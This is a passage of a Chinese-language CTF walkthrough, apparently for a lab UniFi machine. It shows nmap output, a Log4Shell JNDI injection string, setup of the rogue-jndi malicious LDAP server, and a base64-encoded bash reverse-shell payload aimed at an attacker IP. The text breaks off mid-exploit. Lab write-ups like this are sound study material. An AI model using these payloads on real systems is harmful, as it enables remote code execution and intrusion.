class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 10.129.227.191<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 05:14 EDT<br>Warning: 10.129.227.191 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.227.191<br>Host is up (0.13s latency).<br>Not shown: 64714 closed tcp ports (reset), 815 filtered tcp ports (no-response)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>6789/tcp open  ibm-db2-admin<br>8080/tcp open  http-proxy<br>8443/tcp open  https-alt<br>8843/tcp open  unknown<br>8880/tcp open  cddbp-alt<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 28.88 seconds<br><br>┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap -sT -sV -sC -p22,6789,8080,8443,8843,8880 10.129.227.191<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 05:15 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.227.191<br>Host is up (0.0041s latency).<br><br>PORT     STATE SERVICE         VERSION<br>22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)<br>|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)<br>|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)<br>6789/tcp open  ibm-db2-admin?<br>8080/tcp open  http-proxy<br>|_http-open-proxy: Proxy might be redirecting requests<br>|_http-title: Did not follow redirect to https://10.129.227.191:8443/manage<br>| fingerprint-strings:<br>|   FourOhFourRequest:<br>|     HTTP/1.1 404<br>|     Content-Type: text/html;charset=utf-8<br>|     Content-Language: en<br>|     Content-Length: 431<br>|     Date: Mon, 05 Jun 2023 09:15:12 GMT<br>|     Connection: close<br>|     &lt;!doctype html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;&lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;HTTP Status 404<br>|     Found&lt;/title&gt;&lt;style <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:<span class="hljs-comment">#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p &#123;                          font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 404</span><br>|     Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;<br>|   GetRequest, HTTPOptions:<br>|     HTTP/1.1 302<br>|     Location: http://localhost:8080/manage<br>|     Content-Length: 0<br>|     Date: Mon, 05 Jun 2023 09:15:12 GMT<br>|     Connection: close<br>|   RTSPRequest, Socks5:<br>|     HTTP/1.1 400<br>|     Content-Type: text/html;charset=utf-8<br>|     Content-Language: en<br>|     Content-Length: 435<br>|     Date: Mon, 05 Jun 2023 09:15:12 GMT<br>|     Connection: close<br>|     &lt;!doctype html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;&lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;HTTP Status 400<br>|     Request&lt;/title&gt;&lt;style <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:<span class="hljs-comment">#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p                           &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400</span><br>|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;<br>8443/tcp open  ssl/nagios-nsca Nagios NSCA<br>| http-title: UniFi Network<br>|_Requested resource was /manage/account/login?redirect=%2Fmanage<br>| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US<br>| Subject Alternative Name: DNS:UniFi<br>| Not valid before: 2021-12-30T21:37:24<br>|_Not valid after:  2024-04-03T21:37:24<br>8843/tcp open  ssl/unknown<br>| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US<br>| Subject Alternative Name: DNS:UniFi<br>| Not valid before: 2021-12-30T21:37:24<br>|_Not valid after:  2024-04-03T21:37:24<br>| fingerprint-strings:<br>|   GetRequest, HTTPOptions, RTSPRequest:<br>|     HTTP/1.1 400<br>|     Content-Type: text/html;charset=utf-8<br>|     Content-Language: en<br>|     Content-Length: 435<br>|     Date: Mon, 05 Jun 2023 09:15:29 GMT<br>|     Connection: close<br>|     &lt;!doctype html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;&lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;HTTP Status 400<br>|     Request&lt;/title&gt;&lt;style <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:<span class="hljs-comment">#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p                           &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400</span><br>|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;<br>8880/tcp open  cddbp-alt?<br>| fingerprint-strings:<br>|   FourOhFourRequest:<br>|     HTTP/1.1 404<br>|     Content-Type: text/html;charset=utf-8<br>|     Content-Language: en<br>|     Content-Length: 431<br>|     Date: Mon, 05 Jun 2023 09:15:12 GMT<br>|     Connection: close<br>|     &lt;!doctype html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;&lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;HTTP Status 404<br>|     Found&lt;/title&gt;&lt;style <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:<span class="hljs-comment">#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p &#123;                          font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 404</span><br>|     Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;<br>|   GetRequest:<br>|     HTTP/1.1 400<br>|     Content-Type: text/html;charset=utf-8<br>|     Content-Language: en<br>|     Content-Length: 435<br>|     Date: Mon, 05 Jun 2023 09:15:12 GMT<br>|     Connection: close<br>|     &lt;!doctype html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;&lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;HTTP Status 400<br>|     Request&lt;/title&gt;&lt;style <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:<span class="hljs-comment">#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p                           &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400</span><br>|     Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;<br>|   HTTPOptions:<br>|     HTTP/1.1 400<br>|     Content-Type: text/html;charset=utf-8<br>|     Content-Language: en<br>|     Content-Length: 435<br>|     Date: Mon, 05 Jun 2023 09:15:17 GMT<br>|     Connection: close<br>|     &lt;!doctype html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;&lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;HTTP Status 400<br>|     Request&lt;/title&gt;&lt;style <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:<span class="hljs-comment">#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p                           &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400</span><br>|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;<br>3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============<br>SF-Port8080-TCP:V=7.93%I=7%D=6/5%Time=647DA79F%P=x86_64-pc-linux-gnu%r(Get<br>SF:Request,84,<span class="hljs-string">&quot;HTTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080/</span><br><span class="hljs-string">SF:manage\r\nContent-Length:\x200\r\nDate:\x20Mon,\x2005\x20Jun\x202023\x2</span><br><span class="hljs-string">SF:009:15:12\x20GMT\r\nConnection:\x20close\r\n\r\n&quot;</span>)%r(HTTPOptions,84,<span class="hljs-string">&quot;HT</span><br><span class="hljs-string">SF:TP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080/manage\r\nCont</span><br><span class="hljs-string">SF:ent-Length:\x200\r\nDate:\x20Mon,\x2005\x20Jun\x202023\x2009:15:12\x20G</span><br><span class="hljs-string">SF:MT\r\nConnection:\x20close\r\n\r\n&quot;</span>)%r(RTSPRequest,24E,<span class="hljs-string">&quot;HTTP/1\.1\x2040</span><br><span class="hljs-string">SF:0\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\</span><br><span class="hljs-string">SF:x20en\r\nContent-Length:\x20435\r\nDate:\x20Mon,\x2005\x20Jun\x202023\x</span><br><span class="hljs-string">SF:2009:15:12\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;htm</span><br><span class="hljs-string">SF:l\x20lang=\&quot;en\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20</span><br><span class="hljs-string">SF:Bad\x20Request&lt;/title&gt;&lt;style\x20type=\&quot;text/css\&quot;&gt;body\x20&#123;font-family:</span><br><span class="hljs-string">SF:Tahoma,Arial,sans-serif;&#125;\x20h1,\x20h2,\x20h3,\x20b\x20&#123;color:white;bac</span><br><span class="hljs-string">SF:kground-color:#525D76;&#125;\x20h1\x20&#123;font-size:22px;&#125;\x20h2\x20&#123;font-size:</span><br><span class="hljs-string">SF:16px;&#125;\x20h3\x20&#123;font-size:14px;&#125;\x20p\x20&#123;font-size:12px;&#125;\x20a\x20&#123;co</span><br><span class="hljs-string">SF:lor:black;&#125;\x20\.line\x20&#123;height:1px;background-color:#525D76;border:no</span><br><span class="hljs-string">SF:ne;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20B</span><br><span class="hljs-string">SF:ad\x20Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>)%r(FourOhFourRequest,24A,<span class="hljs-string">&quot;HTTP/1\.1\x</span><br><span class="hljs-string">SF:20404\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Langua</span><br><span class="hljs-string">SF:ge:\x20en\r\nContent-Length:\x20431\r\nDate:\x20Mon,\x2005\x20Jun\x2020</span><br><span class="hljs-string">SF:23\x2009:15:12\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;</span><br><span class="hljs-string">SF:&lt;html\x20lang=\&quot;en\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20404\x20\xe2\x80\x93</span><br><span class="hljs-string">SF:\x20Not\x20Found&lt;/title&gt;&lt;style\x20type=\&quot;text/css\&quot;&gt;body\x20&#123;font-famil</span><br><span class="hljs-string">SF:y:Tahoma,Arial,sans-serif;&#125;\x20h1,\x20h2,\x20h3,\x20b\x20&#123;color:white;b</span><br><span class="hljs-string">SF:ackground-color:#525D76;&#125;\x20h1\x20&#123;font-size:22px;&#125;\x20h2\x20&#123;font-siz</span><br><span class="hljs-string">SF:e:16px;&#125;\x20h3\x20&#123;font-size:14px;&#125;\x20p\x20&#123;font-size:12px;&#125;\x20a\x20&#123;</span><br><span class="hljs-string">SF:color:black;&#125;\x20\.line\x20&#123;height:1px;background-color:#525D76;border:</span><br><span class="hljs-string">SF:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20404\x20\xe2\x80\x93\x2</span><br><span class="hljs-string">SF:0Not\x20Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>)%r(Socks5,24E,<span class="hljs-string">&quot;HTTP/1\.1\x20400\x20\r</span><br><span class="hljs-string">SF:\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r</span><br><span class="hljs-string">SF:\nContent-Length:\x20435\r\nDate:\x20Mon,\x2005\x20Jun\x202023\x2009:15</span><br><span class="hljs-string">SF::12\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x20la</span><br><span class="hljs-string">SF:ng=\&quot;en\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20</span><br><span class="hljs-string">SF:Request&lt;/title&gt;&lt;style\x20type=\&quot;text/css\&quot;&gt;body\x20&#123;font-family:Tahoma,</span><br><span class="hljs-string">SF:Arial,sans-serif;&#125;\x20h1,\x20h2,\x20h3,\x20b\x20&#123;color:white;background</span><br><span class="hljs-string">SF:-color:#525D76;&#125;\x20h1\x20&#123;font-size:22px;&#125;\x20h2\x20&#123;font-size:16px;&#125;\</span><br><span class="hljs-string">SF:x20h3\x20&#123;font-size:14px;&#125;\x20p\x20&#123;font-size:12px;&#125;\x20a\x20&#123;color:bla</span><br><span class="hljs-string">SF:ck;&#125;\x20\.line\x20&#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/s</span><br><span class="hljs-string">SF:tyle&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R</span><br><span class="hljs-string">SF:equest&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============<br>SF-Port8843-TCP:V=7.93%T=SSL%I=7%D=6/5%Time=647DA7B0%P=x86_64-pc-linux-gnu<br>SF:%r(GetRequest,24E,<span class="hljs-string">&quot;HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;c</span><br><span class="hljs-string">SF:harset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\r\nDa</span><br><span class="hljs-string">SF:te:\x20Mon,\x2005\x20Jun\x202023\x2009:15:29\x20GMT\r\nConnection:\x20c</span><br><span class="hljs-string">SF:lose\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x20lang=\&quot;en\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\x2</span><br><span class="hljs-string">SF:0Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request&lt;/title&gt;&lt;style\x20type=</span><br><span class="hljs-string">SF:\&quot;text/css\&quot;&gt;body\x20&#123;font-family:Tahoma,Arial,sans-serif;&#125;\x20h1,\x20h</span><br><span class="hljs-string">SF:2,\x20h3,\x20b\x20&#123;color:white;background-color:#525D76;&#125;\x20h1\x20&#123;fon</span><br><span class="hljs-string">SF:t-size:22px;&#125;\x20h2\x20&#123;font-size:16px;&#125;\x20h3\x20&#123;font-size:14px;&#125;\x20</span><br><span class="hljs-string">SF:p\x20&#123;font-size:12px;&#125;\x20a\x20&#123;color:black;&#125;\x20\.line\x20&#123;height:1px;</span><br><span class="hljs-string">SF:background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20</span><br><span class="hljs-string">SF:Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>)%r(<br>SF:HTTPOptions,24E,<span class="hljs-string">&quot;HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;cha</span><br><span class="hljs-string">SF:rset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\r\nDate</span><br><span class="hljs-string">SF::\x20Mon,\x2005\x20Jun\x202023\x2009:15:29\x20GMT\r\nConnection:\x20clo</span><br><span class="hljs-string">SF:se\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x20lang=\&quot;en\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20S</span><br><span class="hljs-string">SF:tatus\x20400\x20\xe2\x80\x93\x20Bad\x20Request&lt;/title&gt;&lt;style\x20type=\&quot;</span><br><span class="hljs-string">SF:text/css\&quot;&gt;body\x20&#123;font-family:Tahoma,Arial,sans-serif;&#125;\x20h1,\x20h2,</span><br><span class="hljs-string">SF:\x20h3,\x20b\x20&#123;color:white;background-color:#525D76;&#125;\x20h1\x20&#123;font-</span><br><span class="hljs-string">SF:size:22px;&#125;\x20h2\x20&#123;font-size:16px;&#125;\x20h3\x20&#123;font-size:14px;&#125;\x20p\</span><br><span class="hljs-string">SF:x20&#123;font-size:12px;&#125;\x20a\x20&#123;color:black;&#125;\x20\.line\x20&#123;height:1px;ba</span><br><span class="hljs-string">SF:ckground-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20St</span><br><span class="hljs-string">SF:atus\x20400\x20\xe2\x80\x93\x20Bad\x20Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>)%r(RT<br>SF:SPRequest,24E,<span class="hljs-string">&quot;HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;chars</span><br><span class="hljs-string">SF:et=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\r\nDate:\</span><br><span class="hljs-string">SF:x20Mon,\x2005\x20Jun\x202023\x2009:15:29\x20GMT\r\nConnection:\x20close</span><br><span class="hljs-string">SF:\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x20lang=\&quot;en\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Sta</span><br><span class="hljs-string">SF:tus\x20400\x20\xe2\x80\x93\x20Bad\x20Request&lt;/title&gt;&lt;style\x20type=\&quot;te</span><br><span class="hljs-string">SF:xt/css\&quot;&gt;body\x20&#123;font-family:Tahoma,Arial,sans-serif;&#125;\x20h1,\x20h2,\x</span><br><span class="hljs-string">SF:20h3,\x20b\x20&#123;color:white;background-color:#525D76;&#125;\x20h1\x20&#123;font-si</span><br><span class="hljs-string">SF:ze:22px;&#125;\x20h2\x20&#123;font-size:16px;&#125;\x20h3\x20&#123;font-size:14px;&#125;\x20p\x2</span><br><span class="hljs-string">SF:0&#123;font-size:12px;&#125;\x20a\x20&#123;color:black;&#125;\x20\.line\x20&#123;height:1px;back</span><br><span class="hljs-string">SF:ground-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Stat</span><br><span class="hljs-string">SF:us\x20400\x20\xe2\x80\x93\x20Bad\x20Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============<br>SF-Port8880-TCP:V=7.93%I=7%D=6/5%Time=647DA7A0%P=x86_64-pc-linux-gnu%r(Get<br>SF:Request,24E,<span class="hljs-string">&quot;HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset</span><br><span class="hljs-string">SF:=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\r\nDate:\x2</span><br><span class="hljs-string">SF:0Mon,\x2005\x20Jun\x202023\x2009:15:12\x20GMT\r\nConnection:\x20close\r</span><br><span class="hljs-string">SF:\n\r\n&lt;!doctype\x20html&gt;&lt;html\x20lang=\&quot;en\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Statu</span><br><span class="hljs-string">SF:s\x20400\x20\xe2\x80\x93\x20Bad\x20Request&lt;/title&gt;&lt;style\x20type=\&quot;text</span><br><span class="hljs-string">SF:/css\&quot;&gt;body\x20&#123;font-family:Tahoma,Arial,sans-serif;&#125;\x20h1,\x20h2,\x20</span><br><span class="hljs-string">SF:h3,\x20b\x20&#123;color:white;background-color:#525D76;&#125;\x20h1\x20&#123;font-size</span><br><span class="hljs-string">SF::22px;&#125;\x20h2\x20&#123;font-size:16px;&#125;\x20h3\x20&#123;font-size:14px;&#125;\x20p\x20&#123;</span><br><span class="hljs-string">SF:font-size:12px;&#125;\x20a\x20&#123;color:black;&#125;\x20\.line\x20&#123;height:1px;backgr</span><br><span class="hljs-string">SF:ound-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status</span><br><span class="hljs-string">SF:\x20400\x20\xe2\x80\x93\x20Bad\x20Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>)%r(FourOh<br>SF:FourRequest,24A,<span class="hljs-string">&quot;HTTP/1\.1\x20404\x20\r\nContent-Type:\x20text/html;cha</span><br><span class="hljs-string">SF:rset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20431\r\nDate</span><br><span class="hljs-string">SF::\x20Mon,\x2005\x20Jun\x202023\x2009:15:12\x20GMT\r\nConnection:\x20clo</span><br><span class="hljs-string">SF:se\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x20lang=\&quot;en\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20S</span><br><span class="hljs-string">SF:tatus\x20404\x20\xe2\x80\x93\x20Not\x20Found&lt;/title&gt;&lt;style\x20type=\&quot;te</span><br><span class="hljs-string">SF:xt/css\&quot;&gt;body\x20&#123;font-family:Tahoma,Arial,sans-serif;&#125;\x20h1,\x20h2,\x</span><br><span class="hljs-string">SF:20h3,\x20b\x20&#123;color:white;background-color:#525D76;&#125;\x20h1\x20&#123;font-si</span><br><span class="hljs-string">SF:ze:22px;&#125;\x20h2\x20&#123;font-size:16px;&#125;\x20h3\x20&#123;font-size:14px;&#125;\x20p\x2</span><br><span class="hljs-string">SF:0&#123;font-size:12px;&#125;\x20a\x20&#123;color:black;&#125;\x20\.line\x20&#123;height:1px;back</span><br><span class="hljs-string">SF:ground-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Stat</span><br><span class="hljs-string">SF:us\x20404\x20\xe2\x80\x93\x20Not\x20Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>)%r(HTTPOp<br>SF:tions,24E,<span class="hljs-string">&quot;HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=u</span><br><span class="hljs-string">SF:tf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\r\nDate:\x20M</span><br><span class="hljs-string">SF:on,\x2005\x20Jun\x202023\x2009:15:17\x20GMT\r\nConnection:\x20close\r\n</span><br><span class="hljs-string">SF:\r\n&lt;!doctype\x20html&gt;&lt;html\x20lang=\&quot;en\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\</span><br><span class="hljs-string">SF:x20400\x20\xe2\x80\x93\x20Bad\x20Request&lt;/title&gt;&lt;style\x20type=\&quot;text/c</span><br><span class="hljs-string">SF:ss\&quot;&gt;body\x20&#123;font-family:Tahoma,Arial,sans-serif;&#125;\x20h1,\x20h2,\x20h3</span><br><span class="hljs-string">SF:,\x20b\x20&#123;color:white;background-color:#525D76;&#125;\x20h1\x20&#123;font-size:2</span><br><span class="hljs-string">SF:2px;&#125;\x20h2\x20&#123;font-size:16px;&#125;\x20h3\x20&#123;font-size:14px;&#125;\x20p\x20&#123;fo</span><br><span class="hljs-string">SF:nt-size:12px;&#125;\x20a\x20&#123;color:black;&#125;\x20\.line\x20&#123;height:1px;backgrou</span><br><span class="hljs-string">SF:nd-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x</span><br><span class="hljs-string">SF:20400\x20\xe2\x80\x93\x20Bad\x20Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 172.46 seconds<br></code></pre></td></tr></table></figure><p>8080 端口的代理似乎是重定向到了 8443 端口</p><p><img src="/pic/0eceeefb46e526ae1387da3ff343fa0f_MD5.png"></p><p>搜索一下，发现存在漏洞信息</p><p><img src="/pic/cafcfc7fab2e5a4ce6eb22e5e080c7ca_MD5.png"></p><p>尝试使用第一个工具直接操作，但是不成功，尝试第二个教程中的操作，也并没有反弹。使用 Burp Suite 才成功</p><p><img src="/pic/c202237f40bbf72e8de09308f21a02ea_MD5.png"></p><p>下面具体讲述一下操作。首先是要验证这个漏洞存在，在 burp 界面中的提交 json 中的 remember 字段中使用引号将 <code>$&#123;jndi:ldap://&#123;Tun0 IP Address&#125;/whatever&#125;</code> 作为字符串，Response 中得到的是错误信息，这并不足以验证漏洞存在，我们还需要在攻击机上使用 tcpdump 来捕获 389 端口的流量（ldap 协议使用的是 389 端口）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(karti㉿kali-ctf)-[~]  <br>└─$ sudo tcpdump -i tun0 port 389  <br>[sudo] password <span class="hljs-keyword">for</span> karti:  <br>tcpdump: verbose output suppressed, use -v[v]... <span class="hljs-keyword">for</span> full protocol decode  <br>listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes  <br>07:27:34.587217 IP 10.129.96.149.53060 &gt; kali-ctf.ldap: Flags [S], <span class="hljs-built_in">seq</span> 4162792509, win 64240, options [mss 1285,sackOK,TS val 1408506213 ecr 0,nop,wscale 7], length 0  <br>07:27:34.587236 IP kali-ctf.ldap &gt; 10.129.96.149.53060: Flags [R.], <span class="hljs-built_in">seq</span> 0, ack 4162792510, win 0, length 0<br></code></pre></td></tr></table></figure><h3 id="构建恶意服务器"><a href="#构建恶意服务器" class="headerlink" title="构建恶意服务器"></a>构建恶意服务器</h3><p>这样就能帮我们确定这个漏洞是存在的，接下来我们需要构建恶意的服务器，当靶机建立连接的时候，命令会从恶意服务器中发送到靶机上。构建恶意服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install openjdk-11-jdk <br>sudo apt-get install maven (mvn -v验证版本，Java项目的构建自动化工具)<br>git <span class="hljs-built_in">clone</span> https://github.com/veracode-research/rogue-jndi<br><span class="hljs-built_in">cd</span> rogue-jndi //用于 JNDI 注入攻击的恶意 LDAP 服务器。<br>mvn package<br></code></pre></td></tr></table></figure><p>构建的 jar 文件会放在 <code>rogue-jndi/target/</code> 文件夹中，我们接下来构造 payload，将其放置在 Rogue-JNDI server 中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;bash -c bash -i &gt;&amp;/dev/tcp/10.10.14.109/4444 0&gt;&amp;1&quot;</span> | <span class="hljs-built_in">base64</span><br>YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTA5LzQ0NDQgMD4mMQo=<br><br></code></pre></td></tr></table></figure><p>我们使用 base64 来防止出现编码问题，接着将其传递给 Rogue-JNDI</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 